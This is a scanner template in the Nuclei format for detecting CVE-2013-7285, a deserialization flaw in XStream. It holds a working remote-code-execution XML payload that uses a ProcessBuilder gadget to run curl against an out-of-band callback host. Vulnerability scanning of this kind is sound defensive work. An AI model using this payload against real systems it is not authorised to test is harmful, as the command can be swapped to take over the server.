id: CVE-2013-7285

info:
  name: XStream > 1.4.6 - Remote Code Execution
  author: pwnhxl
  severity: high
  description: |
    Xstream API versions up to 1.4.6 and version 1.4.10, if the security framework has not been initialized, may allow a remote attacker to run arbitrary shell commands by manipulating the processed input stream when unmarshaling XML or any supported format.
  reference:
    - http://x-stream.github.io/CVE-2013-7285.html
  tags: cve,cve2013,xstream,deserialization,rce,oast

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <contact class='dynamic-proxy'>
          <interface>org.company.model.Contact</interface>
          <handler class='java.beans.EventHandler'>
            <target class='java.lang.ProcessBuilder'>
              <command>
                <string>curl http://{{interactsh-url}} -H 'User-Agent: nuclei'</string>
              </command>
            </target>
            <action>start</action>
          </handler>
        </contact>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: word
        part: interactsh_request
        words:
          - "User-Agent: nuclei"
